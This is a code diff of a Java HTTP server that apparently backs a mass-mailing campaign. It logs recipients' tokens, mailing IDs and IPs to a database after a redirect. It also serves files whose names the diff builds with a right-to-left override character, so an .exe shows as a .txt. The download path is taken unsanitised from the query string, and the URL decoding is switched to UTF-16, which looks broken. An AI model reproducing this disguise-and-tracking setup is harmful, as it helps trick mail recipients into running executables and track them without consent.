@@ -23,7 +23,7 @@ public class HTTPServer {
     private static boolean IS_ACTIVE = false;
     private static HttpServer server;
     static final Logger log = Logger.getLogger(StartApplication.class.getName());
-    static SettingsSingleton ss = SettingsSingleton.getInstance();
+    static final SettingsSingleton ss = SettingsSingleton.getInstance();
 
     public static void startHttpServer() {
         try {
@@ -47,7 +47,7 @@ public class HTTPServer {
         }
     }
 
-    public static void stopHttpServer() {
+/*    public static void stopHttpServer() {//TODO: сделать кнопку для остановки?
         try {
             if (IS_ACTIVE) {
                 server.stop(10);
@@ -58,7 +58,7 @@ public class HTTPServer {
             log.logp(Level.SEVERE, "HTTPServer", "stopHttpServer", e.toString());
             throw new RuntimeException(e);
         }
-    }
+    }*/
 
 
     static class Handler implements HttpHandler {
@@ -66,8 +66,10 @@ public class HTTPServer {
 
         private String[] handleGetRequest(HttpExchange t) {
             String[] args = new String[2];
+
             args[0] = t.getRequestURI().toString().split("\\?")[1].split("&")[0].split("=")[1];
             args[1] = t.getRequestURI().toString().split("\\?")[1].split("&")[1].split("=")[1];
+
             return args;
         }
 
@@ -81,11 +83,14 @@ public class HTTPServer {
                             "token = " + args[0] + " mailing_id = " + args[1]);
                     return;
                 }
-                String token = java.net.URLDecoder.decode(args[0], StandardCharsets.UTF_8);
+                String token = java.net.URLDecoder.decode(args[0], StandardCharsets.UTF_16);
+                System.out.println("token decoded " + token);
+
                 t.getResponseHeaders().set("Location", "https://habr.com/ru/articles/427995/");
                 t.sendResponseHeaders(303, 0);
 
                 String ip = validateToken(token);
+
                 if (ip != null) {
                     DB db = new DB();
                     db.connect();
@@ -112,9 +117,9 @@ public class HTTPServer {
                 if (t.getRequestMethod().equalsIgnoreCase("GET")) {
                     log.logp(Level.INFO, "DownloadHandler", "handle", "Handle request = " + t.getRequestURI());
 
-                    String filename = java.net.URLDecoder.decode(t.getRequestURI().toString().split("\\?")[1].split("=")[1], StandardCharsets.UTF_8);
+                    String filename = java.net.URLDecoder.decode(t.getRequestURI().toString().split("\\?")[1].split("=")[1], StandardCharsets.UTF_16);
                     SettingsSingleton ss = SettingsSingleton.getInstance();
-                    String requestedFile = ss.getWORKING_DIRECTORY()+"/files/" + filename + "\u202excod.exe";//Document_\u202Excod.exe";
+                    String requestedFile = ss.getWORKING_DIRECTORY()+"/files/" + filename + "\u202etxt.exe";//Document_\u202Excod.exe";
 
                     Path fileToSend = Paths.get(requestedFile);
                     if (Files.exists(fileToSend)) {
